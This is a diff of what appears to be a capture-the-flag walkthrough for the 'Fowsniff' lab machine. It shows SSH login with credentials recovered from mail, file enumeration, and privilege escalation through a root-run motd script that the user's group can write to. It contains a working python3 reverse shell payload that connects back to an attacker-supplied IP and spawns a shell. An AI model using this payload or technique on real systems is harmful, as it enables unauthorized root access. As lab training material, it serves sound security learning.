@@ -99,16 +99,17 @@ RETR 2   - Retrives second message
 
 ![image](https://user-images.githubusercontent.com/76821053/166566847-a75b12cc-aff6-426a-9a04-a431d03db427.png)
 
-Found ssh credentials.
+In the first message there is ssh credentials. They belong to user "backsteen".
 
-These credentials pertains to backsteen.
+With them we can connect to the target machine through ssh:
+
+```
+ssh backsteen@fowsniff.thm
+```
 
 ![image](https://user-images.githubusercontent.com/76821053/166566877-f6437936-4876-428f-b5bd-d136916aa6cf.png)
 
-ls
-
-
-Enumerating the system i searched for any files that can be run by that group users:
+When enumerating the system i searched for any files that can be run by that group users:
 
 ```
 find / -group users -type f -exec ls -la {} 2>/dev/null \;
@@ -121,13 +122,15 @@ Found that users group have read/write permissions of a bash script called cube.
 
 ![image](https://user-images.githubusercontent.com/76821053/166566918-dfa97f58-bc9f-43d9-81de-23cb4398adbc.png)
 
-After reading the contents of cube.sh we can recognize that this prints the motd (message of the day) that we receive after loggin in through ssh.
+After reading the contents of cube.sh we can recognize that this prints the motd (message of the day) that we receive after connecting through ssh.
 
 If we check the directory /etc/update-motd.d/ and look into the executables, the file “00-header” runs the cube.sh script with root permissions.
 
 ![image](https://user-images.githubusercontent.com/76821053/166566946-76373e54-79b5-48c1-bd7b-3e12788de657.png)
 
-Since we have group permissions to write cube.sh script we can try and get a reverse shell by including a python3 reverse shell payload.
+This is our way to get a privilege escalation in this machine. Since we have group permissions to write cube.sh script we can try and get a reverse shell by including a python3 reverse shell payload.
+
+We need to edit the cube.sh file with "nano" or "vim" and add the python reverse shell.
 
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
